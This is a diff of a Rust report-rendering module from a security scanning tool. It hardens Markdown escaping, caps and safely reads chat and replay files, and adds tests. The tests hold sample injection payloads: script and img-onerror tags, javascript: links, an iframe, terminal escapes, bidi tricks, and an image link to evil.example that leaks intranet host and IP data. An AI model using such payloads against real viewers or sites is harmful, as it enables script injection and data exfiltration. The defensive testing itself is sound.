@@ -15,7 +15,7 @@ use anyhow::{Context, Result};
 use crate::checklist;
 use crate::cve;
 use crate::db::Db;
-use crate::evidence::{Source, VerificationStatus};
+use crate::evidence::{inert_markdown, Source, VerificationStatus};
 use crate::graph::{Advisory, Fact, Graph, Host};
 use crate::mode::Mode;
 use crate::queue::{self, TaskRow};
@@ -27,6 +27,7 @@ use crate::workspace::{write_private_atomic, Workspace};
 const MAX_REPLAY_LINES: usize = 600;
 const MAX_PATHS_PER_PORT: usize = 80;
 const MAX_FACTS_PER_HOST: usize = 80;
+const MAX_REPORT_FILE_BYTES: u64 = 4 * 1024 * 1024;
 
 /// Everything the report is built from.
 pub struct Inputs {
@@ -42,30 +43,65 @@ pub struct Inputs {
     pub chats: Vec<(String, String)>,
 }
 
-/// Escapes scanned text for use in Markdown prose and table cells, so a
-/// banner cannot inject HTML or break a table.
-fn md(text: &str) -> String {
-    text.replace('&', "&amp;")
-        .replace('<', "&lt;")
-        .replace('>', "&gt;")
-        .replace('|', "\\|")
-        .replace(['\n', '\r'], " ")
+const MAX_TOTAL_CHAT_BYTES: u64 = 64 * 1024 * 1024;
+const MAX_CHAT_FILES: usize = 1_000;
+const MAX_CHAT_DIR_ENTRIES: usize = 10_000;
+
+fn strip_inline_controls(text: &str) -> String {
+    text.chars()
+        .filter_map(|ch| match ch {
+            '\n' | '\r' | '\t' => Some(' '),
+            c if c.is_control() || crate::evidence::is_hidden(c) => None,
+            c => Some(c),
+        })
+        .collect()
 }
 
-/// Scanned text as an inline code span.
+/// Escapes scanned text for use in Markdown prose and table cells: it is
+/// shown as the characters it is. A banner cannot inject HTML, terminal
+/// escapes, invisible/bidi characters, break a table, or become an image
+/// (fetched by whoever opens the report), a link, emphasis or a heading.
+fn md(text: &str) -> String {
+    let cleaned = strip_inline_controls(text);
+    let mut out = String::with_capacity(cleaned.len() + 8);
+    for ch in cleaned.chars() {
+        match ch {
+            '&' => out.push_str("&amp;"),
+            '<' => out.push_str("&lt;"),
+            '>' => out.push_str("&gt;"),
+            // The backslash first of all: `\|` must not become `\\|`, an
+            // escaped backslash followed by a real cell border.
+            '\\' | '|' | '`' | '*' | '_' | '[' | ']' | '!' | '~' | '#' | '$' => {
+                out.push('\\');
+                out.push(ch);
+            }
+            other => out.push(other),
+        }
+    }
+    out
+}
+
+/// Scanned text as an inline code span, safe for use inside table cells.
 fn code(text: &str) -> String {
-    format!("`{}`", text.replace('`', "'").replace(['\n', '\r'], " "))
+    format!(
+        "`{}`",
+        strip_inline_controls(text)
+            .replace('`', "'")
+            .replace('|', "\\|")
+    )
+}
+
+/// [`code`] for a table cell, where a bare `|` ends the cell, code span or
+/// not, and a `\` before `|` must not produce `\\|`.
+fn code_cell(text: &str) -> String {
+    code(&text.replace('\\', "/"))
 }
 
 fn clean_chat_line(line: &str) -> String {
     line.chars()
         .filter_map(|ch| match ch {
             '\t' => Some(' '),
-            c if c.is_control() => None,
-            '\u{200b}'..='\u{200f}'
-            | '\u{202a}'..='\u{202e}'
-            | '\u{2066}'..='\u{2069}'
-            | '\u{feff}' => None,
+            c if c.is_control() || crate::evidence::is_hidden(c) => None,
             c => Some(c),
         })
         .collect()
@@ -89,18 +125,17 @@ fn find_closing_ticks(bytes: &[u8], from: usize, count: usize) -> Option<usize> 
     None
 }
 
-fn escape_html_outside_inline_code(line: &str) -> String {
+fn neutralize_unmatched_inline_backticks(line: &str) -> String {
     let mut out = String::with_capacity(line.len());
     let bytes = line.as_bytes();
     let mut i = 0;
-    let leading_spaces = bytes.iter().take(3).take_while(|&&b| b == b' ').count();
-    if bytes.get(leading_spaces) == Some(&b'>')
-        && matches!(bytes.get(leading_spaces + 1), None | Some(b' '))
-    {
-        out.push_str(&line[..=leading_spaces]);
-        i = leading_spaces + 1;
-    }
     while i < line.len() {
+        if bytes[i] == b'\\' && bytes.get(i + 1).is_some_and(|b| b.is_ascii_punctuation()) {
+            out.push('\\');
+            out.push(bytes[i + 1] as char);
+            i += 2;
+            continue;
+        }
         if bytes[i] == b'`' {
             let start = i;
             while i < bytes.len() && bytes[i] == b'`' {
@@ -112,16 +147,12 @@ fn escape_html_outside_inline_code(line: &str) -> String {
                 out.push_str(&line[start..end]);
                 i = end;
             } else {
-                out.push_str(&line[start..i]);
+                out.extend(std::iter::repeat_n('\'', tick_len));
             }
             continue;
         }
         let ch = line[i..].chars().next().expect("i < line.len()");
-        match ch {
-            '<' => out.push_str("&lt;"),
-            '>' => out.push_str("&gt;"),
-            other => out.push(other),
-        }
+        out.push(ch);
         i += ch.len_utf8();
     }
     out
@@ -154,36 +185,44 @@ fn is_fence_closing(line: &str, marker: u8, min_len: usize) -> bool {
     }
     let rest = &line.as_bytes()[indent..];
     let len = rest.iter().take_while(|&&b| b == marker).count();
-    len >= min_len && rest[len..].iter().all(|&b| b == b' ')
+    len >= min_len && rest[len..].iter().all(|&b| b == b' ' || b == b'\t')
 }
 
+/// Writes a chat file into the report: its own headings one level down, and
+/// nothing in it live (see [`inert_markdown`]). A code block the text left
+/// open is closed, so that it cannot take the rest of the report with it.
 fn render_chat_markdown(out: &mut String, text: &str) {
-    let mut in_fence: Option<(u8, usize)> = None;
-    for raw_line in text.lines() {
-        let line = clean_chat_line(raw_line);
-        if let Some((marker, min_len)) = in_fence {
-            if is_fence_closing(&line, marker, min_len) {
-                in_fence = None;
+    let mut open_fence: Option<(u8, usize)> = None;
+    for line in inert_markdown(text).lines() {
+        if let Some((open, length)) = open_fence {
+            if is_fence_closing(line, open, length) {
+                open_fence = None;
             }
-            out.push_str(&line);
+            out.push_str(line);
             out.push('\n');
             continue;
         }
-        if let Some(fence) = fence_opening(&line) {
-            in_fence = Some(fence);
-            out.push_str(&line);
+        if let Some(fence) = fence_opening(line) {
+            open_fence = Some(fence);
+            out.push_str(line);
             out.push('\n');
             continue;
         }
-        // Nest the file's own headings below this section.
-        if line.starts_with('#') {
+        let sanitized = neutralize_unmatched_inline_backticks(line);
+        let indent = sanitized.bytes().take(4).take_while(|&b| b == b' ').count();
+        // Nest the file's own headings below this section, also one that
+        // is moved in by up to three spaces.
+        if indent <= 3 && sanitized.as_bytes().get(indent) == Some(&b'#') {
+            out.push_str(&sanitized[..indent]);
             out.push_str("###");
+            out.push_str(&sanitized[indent..]);
+        } else {
+            out.push_str(&sanitized);
         }
-        out.push_str(&escape_html_outside_inline_code(&line));
         out.push('\n');
     }
-    if let Some((marker, len)) = in_fence {
-        out.extend(std::iter::repeat_n(marker as char, len));
+    if let Some((marker, length)) = open_fence {
+        out.extend(std::iter::repeat_n(marker as char, length));
         out.push('\n');
     }
 }
@@ -235,6 +274,24 @@ fn render_host(out: &mut String, host: &Host) {
     if let Some(os) = &host.os {
         let _ = writeln!(out, "Operating system: {}\n", md(os));
     }
+    if let Some(asn) = &host.asn {
+        let pfx = host
+            .bgp_prefix
+            .as_deref()
+            .map(|p| format!(" ({})", md(p)))
+            .unwrap_or_default();
+        let _ = writeln!(out, "ASN / Hosting: {}{pfx}\n", md(asn));
+    }
+    if let Some(ipv6) = &host.ipv6_dns {
+        let _ = writeln!(out, "IPv6 DNS: {}\n", md(ipv6));
+    }
+    if let Some(waf) = &host.waf_cdn {
+        let _ = writeln!(out, "WAF / CDN: {}\n", md(waf));
+    }
+    if !host.hops.is_empty() {
+        let route_str: Vec<String> = host.hops.iter().map(|h| md(h)).collect();
+        let _ = writeln!(out, "Traceroute hops: {}\n", route_str.join(" -> "));
+    }
     if host.ports.is_empty() {
         out.push_str("No ports seen.\n\n");
     } else {
@@ -245,8 +302,30 @@ fn render_host(out: &mut String, host: &Host) {
             let cell =
                 |value: &Option<String>| value.as_deref().map(md).unwrap_or_else(|| "-".to_owned());
             let mut extra = Vec::new();
-            if let Some(server) = port.http.as_ref().and_then(|h| h.server.as_ref()) {
-                extra.push(format!("Server: {}", md(server)));
+            if let Some(http) = &port.http {
+                if let Some(server) = &http.server {
+                    extra.push(format!("Server: {}", md(server)));
+                }
+                if let Some(title) = &http.title {
+                    extra.push(format!("Title: {}", md(title)));
+                }
+                if let Some(waf) = &http.waf {
+                    extra.push(format!("WAF: {}", md(waf)));
+                }
+                if let Some(hash) = http.favicon_hash {
+                    match &http.favicon_framework {
+                        Some(fw) => extra.push(format!("Favicon: {hash} ({})", md(fw))),
+                        None => extra.push(format!("Favicon: {hash}")),
+                    }
+                }
+                if !http.missing_headers.is_empty() {
+                    let mh: Vec<String> = http.missing_headers.iter().map(|h| md(h)).collect();
+                    extra.push(format!("Missing headers: {}", mh.join(", ")));
+                }
+                if !http.tls_versions.is_empty() {
+                    let tv: Vec<String> = http.tls_versions.iter().map(|v| md(v)).collect();
+                    extra.push(format!("TLS: {}", tv.join(", ")));
+                }
             }
             if !port.tls_sans.is_empty() {
                 let names: Vec<String> = port.tls_sans.iter().map(|n| md(n)).collect();
@@ -404,7 +483,9 @@ pub fn render(inputs: &Inputs) -> String {
     }
     for (host, advisory) in &confirmed {
         let _ = writeln!(out, "### {} on {}\n", md(&advisory.id), md(&host.label()));
-        let _ = writeln!(out, "{}\n", md(&advisory.title));
+        // Fixed words first: a title cannot start the line as a list
+        // item, a quote or a heading of its own.
+        let _ = writeln!(out, "Summary: {}\n", md(&advisory.title));
         let _ = writeln!(out, "- Severity: {}", md(&severity(advisory)));
         if advisory.kev {
             out.push_str("- Listed in the CISA Known Exploited Vulnerabilities catalog\n");
@@ -494,11 +575,14 @@ pub fn render(inputs: &Inputs) -> String {
                 md(&note.record.timestamp_utc)
             );
             if note.record.source == Source::GitDiff {
-                let _ = writeln!(
-                    out,
-                    "\n```diff\n{}\n```\n",
-                    note.record.evidence.replace("```", "'''")
-                );
+                let cleaned_diff: String = note
+                    .record
+                    .evidence
+                    .lines()
+                    .map(|line| clean_chat_line(line).replace("```", "'''"))
+                    .collect::<Vec<_>>()
+                    .join("\n");
+                let _ = writeln!(out, "\n```diff\n{cleaned_diff}\n```\n");
             }
         }
         out.push('\n');
@@ -516,8 +600,8 @@ pub fn render(inputs: &Inputs) -> String {
             let _ = writeln!(
                 out,
                 "| {} | {} | {} |",
-                code(&secret.token),
-                code(&secret.preview),
+                code_cell(&secret.token),
+                code_cell(&secret.preview),
                 md(&secret.first_seen_utc)
             );
         }
@@ -568,7 +652,8 @@ pub fn render(inputs: &Inputs) -> String {
                 .skip(lines.len().saturating_sub(MAX_REPLAY_LINES))
             {
                 // A fence inside the trail must not end the block.
-                out.push_str(&line.replace("```", "'''"));
+                let cleaned = clean_chat_line(line);
+                out.push_str(&cleaned.replace("```", "'''").replace("~~~", "---"));
                 out.push('\n');
             }
             out.push_str("```\n\n");
@@ -587,23 +672,105 @@ pub fn render(inputs: &Inputs) -> String {
     out
 }
 
+/// Renders a single-host engagement report containing that host's Evidence,
+/// confirmed Advisories, unverified hypotheses, operator notes, and AI
+/// remediation chat (`chats/<address>.md`).
+pub fn render_host_report(inputs: &Inputs, address: &str) -> Option<String> {
+    let host = inputs.graph.host(address)?.clone();
+    let canonical = host.address.clone();
+    let chat_file = crate::ai::chat_file_name(&canonical);
+    let mut sub_graph = Graph::default();
+    sub_graph.local = inputs.graph.local.clone();
+    sub_graph.hosts.insert(canonical.clone(), host.clone());
+    let tasks = inputs
+        .tasks
+        .iter()
+        .filter(|t| {
+            t.target.eq_ignore_ascii_case(&canonical)
+                || host
+                    .hostnames
+                    .iter()
+                    .any(|h| h.eq_ignore_ascii_case(&t.target))
+        })
+        .cloned()
+        .collect();
+    let chats = inputs
+        .chats
+        .iter()
+        .filter(|(name, _)| name == &chat_file || name == &format!("{canonical}.md"))
+        .cloned()
+        .collect();
+    let filtered = Inputs {
+        session: format!("{} ({})", inputs.session, host.label()),
+        mode: inputs.mode,
+        generated_utc: inputs.generated_utc.clone(),
+        graph: sub_graph,
+        tasks,
+        secrets: inputs.secrets.clone(),
+        replay: inputs.replay.clone(),
+        chats,
+    };
+    Some(render(&filtered))
+}
+
+fn read_regular_capped(path: &std::path::Path, max_bytes: u64) -> Option<String> {
+    use std::io::Read as _;
+    if max_bytes == 0 {
+        return None;
+    }
+    let meta = std::fs::symlink_metadata(path).ok()?;
+    if meta.file_type().is_symlink() || !meta.is_file() {
+        return None;
+    }
+    let file = crate::workspace::private_open_options()
+        .read(true)
+        .open(path)
+        .ok()?;
+    if !file.metadata().ok()?.is_file() {
+        return None;
+    }
+    let mut buf = Vec::new();
+    file.take(max_bytes).read_to_end(&mut buf).ok()?;
+    Some(String::from_utf8_lossy(&buf).into_owned())
+}
+
+/// Reads `replay.sh` and `chats/*.md` from `workspace_dir` with size caps.
+pub fn read_chats_and_replay(
+    workspace_dir: &std::path::Path,
+) -> (Option<String>, Vec<(String, String)>) {
+    let mut chat_files = Vec::new();
+    if let Ok(entries) = std::fs::read_dir(workspace_dir.join("chats")) {
+        for entry in entries.flatten().take(MAX_CHAT_DIR_ENTRIES) {
+            let path = entry.path();
+            if path.extension().is_some_and(|ext| ext == "md") {
+                chat_files.push((entry.file_name().to_string_lossy().into_owned(), path));
+            }
+        }
+    }
+    chat_files.sort_by(|a, b| a.0.cmp(&b.0));
+    chat_files.truncate(MAX_CHAT_FILES);
+    let mut remaining_chat_bytes = MAX_TOTAL_CHAT_BYTES;
+    let mut chats = Vec::new();
+    for (name, path) in chat_files {
+        if remaining_chat_bytes == 0 {
+            break;
+        }
+        let limit = MAX_REPORT_FILE_BYTES.min(remaining_chat_bytes);
+        if let Some(text) = read_regular_capped(&path, limit) {
+            remaining_chat_bytes = remaining_chat_bytes.saturating_sub(text.len() as u64);
+            chats.push((name, text));
+        }
+    }
+    let replay = read_regular_capped(&workspace_dir.join("replay.sh"), MAX_REPORT_FILE_BYTES);
+    (replay, chats)
+}
+
 /// Gathers the report inputs from a workspace on disk.
 pub fn collect(workspace: &Workspace) -> Result<Inputs> {
     let db = Arc::new(Mutex::new(Db::open(&workspace.state_db_path())?));
     let tasks = queue::tasks(&db.lock().unwrap_or_else(|p| p.into_inner()), 200)?;
     let secrets = Vault::open(Arc::clone(&db))?.exposed_secrets();
-    let mut chats = Vec::new();
-    if let Ok(entries) = std::fs::read_dir(workspace.chats_dir()) {
-        for entry in entries.flatten() {
-            let path = entry.path();
-            if path.extension().is_some_and(|ext| ext == "md") {
-                if let Ok(text) = std::fs::read_to_string(&path) {
-                    chats.push((entry.file_name().to_string_lossy().into_owned(), text));
-                }
-            }
-        }
-    }
-    chats.sort();
+    let (replay, chats) = read_chats_and_replay(&workspace.dir);
     Ok(Inputs {
         session: workspace.name.clone(),
         mode: workspace.profile.mode,
@@ -611,7 +778,7 @@ pub fn collect(workspace: &Workspace) -> Result<Inputs> {
         graph: Graph::load(&workspace.graph_path())?,
         tasks,
         secrets,
-        replay: std::fs::read_to_string(workspace.replay_path()).ok(),
+        replay,
         chats,
     })
 }
@@ -893,7 +1060,24 @@ mod tests {
             "{text}"
         );
         assert_eq!(md("a|b\n<c>&"), "a\\|b &lt;c&gt;&amp;");
+        assert_eq!(
+            md("[click](javascript:alert(1))"),
+            "\\[click\\](javascript:alert(1))"
+        );
         assert_eq!(code("x`y\nz"), "`x'y z`");
+        assert_eq!(code("a|b"), "`a\\|b`");
+
+        let mut chat_out = String::new();
+        render_chat_markdown(
+            &mut chat_out,
+            "unmatched ` backtick\n`<script>alert(1)</script>`\n   # Indented H1\nFake H1\n===\n",
+        );
+        assert!(
+            !chat_out.contains("` backtick") && chat_out.contains("' backtick"),
+            "unmatched backtick must be neutralized so it cannot join next line's backtick: {chat_out}"
+        );
+        assert!(chat_out.contains("#### Indented H1"), "{chat_out}");
+        assert!(chat_out.contains("\\==="), "{chat_out}");
 
         // Untrusted advisory.port and raw HTML in chats/*.md are escaped,
         // while inline code spans, fenced code blocks, and unclosed fences are
@@ -918,12 +1102,135 @@ mod tests {
         ];
         let rendered = render(&custom);
         assert!(rendered.contains("| 443/tcp \\| &lt;img src=x&gt; |"));
-        assert!(rendered.contains("#### Heading &lt;script&gt;alert(1)&lt;/script&gt;"));
-        assert!(rendered.contains("> Quote with &lt;b&gt;html&lt;/b&gt; and `<raw>` span"));
+        // No tag opens anywhere, in or out of code: what counts as code
+        // differs between Markdown dialects.
+        assert!(rendered.contains("#### Heading &lt;script>alert(1)&lt;/script>"));
+        assert!(rendered.contains("> Quote with &lt;b>html&lt;/b> and `&lt;raw>` span"));
         assert!(rendered.contains("```sh\n# shell comment stays a comment\n"));
-        assert!(rendered.contains("grep '<title>'"));
-        assert!(rendered.contains("<div>unclosed fence\n```\n\n### From chats/192.0.2.2.md"));
+        assert!(rendered.contains("grep '&lt;title>'"));
+        assert!(rendered.contains("&lt;div>unclosed fence\n```\n\n### From chats/192.0.2.2.md"));
         assert!(rendered.contains("##### Next chat"));
+        for tag in ["<script", "<img", "<b>", "<div", "<raw"] {
+            assert!(!rendered.contains(tag), "{tag}");
+        }
+    }
+
+    #[test]
+    fn scanned_text_is_shown_as_text_never_as_markdown() {
+        let mut custom = inputs();
+        {
+            let host = custom.graph.hosts.get_mut("10.10.10.5").unwrap();
+            let port = host.ports.get_mut("443/tcp").unwrap();
+            port.http.as_mut().unwrap().server = Some(
+                "nginx ![s](https://e.example/x.png) [a](javascript:1) \\| **b** _c_ `d`".into(),
+            );
+            port.version = Some("1.18.0 [vendor fix](https://e.example/fix.sh)".into());
+            port.tls_sans.insert("![c](https://e.example/b.png)".into());
+            // A confirmed finding whose title starts like a list item and
+            // opens a code block.
+            host.advisories[0].title = "- Status: fixed ``` swallow the rest".into();
+            host.advisories[0].record.verification_status = VerificationStatus::Confirmed;
+        }
+        custom.secrets = vec![crate::vault::ExposedSecret {
+            token: "<<SEC_01>>".into(),
+            preview: "a|b... (9 chars)".into(),
+            first_seen_utc: "2026-11-12T09:00:00Z".into(),
+        }];
+        let rendered = render(&custom);
+        for live in [
+            "![s](",
+            "![c](",
+            "[a](javascript:",
+            "[vendor fix](https://",
+            "**b**",
+            " _c_ ",
+        ] {
+            assert!(!rendered.contains(live), "{live} is live in:\n{rendered}");
+        }
+        assert!(
+            rendered.contains("!\\[s\\](https://e.example/x.png)"),
+            "{rendered}"
+        );
+        assert!(rendered.contains("\\*\\*b\\*\\*"));
+        // The port row keeps its cells: the `\|` of the header did not end one.
+        let row = rendered
+            .lines()
+            .find(|line| line.starts_with("| 443/tcp |"))
+            .unwrap();
+        let cells = row
+            .replace("\\\\", "")
+            .replace("\\|", "")
+            .matches('|')
+            .count();
+        let header = rendered
+            .lines()
+            .find(|line| line.starts_with("| Port |"))
+            .unwrap();
+        assert_eq!(cells, header.matches('|').count(), "{row}");
+        // The title neither opens a code block nor starts a list item, and
+        // what follows the finding is still there, outside any block.
+        assert!(
+            rendered.contains("Summary: - Status: fixed \\`\\`\\` swallow the rest"),
+            "{rendered}"
+        );
+        assert!(rendered.contains("\n## Hosts\n"));
+        assert!(
+            rendered.contains("| `<<SEC_01>>` | `a\\|b... (9 chars)` |"),
+            "{rendered}"
+        );
+    }
+
+    #[test]
+    fn a_model_reply_is_written_inert_into_the_report() {
+        let mut custom = inputs();
+        custom.chats = vec![(
+            "192.0.2.10.md".into(),
+            // What the 2026-11 audit used against the earlier filter.
+            "![s](https://evil.example/c.png?h=intranet.corp.example&ip=10.1.2.3)\n\
+             \\` <img src=x onerror=alert(1)> \\`\n\
+             a line ending in a lone `\n\
+             ` <script>alert(2)</script> `\n\
+             [ref]: javascript:alert(3)\n\
+             see [the fix][ref] and <https://evil.example/auto>\n\
+             Confirmed findings\n\
+             ===\n\
+             \u{20}# Forged section\n\
+             ```{=html}\n\
+             <iframe src=//evil.example></iframe>\n\
+             ```\n\
+             Sources\n\
+             ---\n\
+             \n\
+             ---\n"
+                .into(),
+        )];
+        let rendered = render(&custom);
+        let chat = &rendered[rendered.find("### From chats/192.0.2.10.md").unwrap()..];
+        for live in [
+            "![s](",
+            "<img",
+            "<script",
+            "<iframe",
+            "<https://",
+            "\n[ref]:",
+            "\n===",
+            "\n # Forged",
+            "\n## Forged",
+            "\nSources\n---",
+        ] {
+            assert!(!chat.contains(live), "{live:?} is live in:\n{chat}");
+        }
+        assert!(chat.contains("!\\[s]\\(https://evil.example/c.png"));
+        assert!(chat.contains("[ref]\\: javascript:alert(3)"));
+        assert!(chat.contains("\n\\===\n"));
+        // One level down like every other heading of the file, not a new
+        // top-level section of the report.
+        assert!(chat.contains("\n #### Forged section"), "{chat}");
+        // A rule after an empty line is still a rule.
+        assert!(chat.contains("\n\n---\n"));
+        // Writing it twice changes nothing.
+        let once = inert_markdown(&custom.chats[0].1);
+        assert_eq!(inert_markdown(&once), once);
     }
 
     #[test]
@@ -1022,5 +1329,86 @@ mod tests {
                 .count(),
             1
         );
+    }
+
+    #[test]
+    fn md_and_code_strip_controls_and_bidi_directly() {
+        assert_eq!(
+            md("banner\x1b]0;pwn\x07\u{202e}txt.exe|cell"),
+            "banner\\]0;pwntxt.exe\\|cell"
+        );
+        assert_eq!(code("cpe\x1b[2J\u{2066}hidden`tick"), "`cpe[2Jhidden'tick`");
+    }
+
+    #[test]
+    fn fence_smuggling_git_diff_hidden_fences_and_non_regular_files_are_blocked() {
+        // 1. CommonMark: a backtick fence info string cannot contain '`', so
+        //    "```inline`" is NOT a fence opener and must not let "# Forged H1"
+        //    escape heading demotion or emit a stray closing fence.
+        let mut fake_open = String::new();
+        render_chat_markdown(&mut fake_open, "```inline`\n# Forged H1\n");
+        assert!(
+            fake_open.contains("#### Forged H1"),
+            "heading after non-fence backtick line must still be demoted: {fake_open}"
+        );
+        assert!(
+            !fake_open.ends_with("```\n"),
+            "must not emit a stray closing fence: {fake_open}"
+        );
+
+        // 2. CommonMark: a closing fence cannot have trailing non-space text,
+        //    so "```still_open" inside a fence must NOT trick us into leaving
+        //    the fence unclosed before the next chat.
+        let mut fake_close = String::new();
+        render_chat_markdown(&mut fake_close, "```sh\n```still_open\n");
+        assert!(
+            fake_close.ends_with("```still_open\n```\n"),
+            "unclosed fence after spoofed close must still be closed: {fake_close}"
+        );
+
+        // 3. Escaped `\` before `` ` `` does not pair with an unescaped `` ` ``.
+        let mut parity = String::new();
+        render_chat_markdown(&mut parity, "\\` lone unescaped `\n");
+        assert_eq!(parity, "\\` lone unescaped '\n");
+
+        // 4. GitDiff evidence containing zero-width / Unicode tag chars between
+        //    backticks cannot break out of ```diff.
+        let mut custom = inputs();
+        custom.graph.notes.push(Fact {
+            claim: "tampered diff".into(),
+            record: EvidenceRecord {
+                source: Source::GitDiff,
+                timestamp_utc: "2026-11-12T09:41:00Z".into(),
+                confidence: Confidence::High,
+                evidence: "@@ -1 +1 @@\n-``\u{200b}`\n+<script>alert(1)</script>".into(),
+                verification_status: VerificationStatus::Observed,
+            },
+        });
+        let rendered = render(&custom);
+        assert!(
+            rendered.contains("```diff\n@@ -1 +1 @@\n-'''\n+<script>alert(1)</script>\n```"),
+            "{rendered}"
+        );
+
+        // 5. Symlinked replay.sh and chats/*.md are ignored by collect().
+        #[cfg(unix)]
+        {
+            use crate::workspace::MeowHome;
+            let tmp = tempfile::tempdir().unwrap();
+            let secret_outside = tmp.path().join("outside.txt");
+            std::fs::write(&secret_outside, "TOP_SECRET_OUTSIDE").unwrap();
+            let home = MeowHome::at(tmp.path().join(".meow")).unwrap();
+            let (workspace, _) =
+                Workspace::open_or_create(&home, tmp.path(), "symtest", false, Mode::Light)
+                    .unwrap();
+            let _ = std::fs::remove_file(workspace.replay_path());
+            std::os::unix::fs::symlink(&secret_outside, workspace.replay_path()).unwrap();
+            std::os::unix::fs::symlink(&secret_outside, workspace.chats_dir().join("leak.md"))
+                .unwrap();
+
+            let collected = collect(&workspace).unwrap();
+            assert!(collected.replay.is_none());
+            assert!(collected.chats.is_empty());
+        }
     }
 }
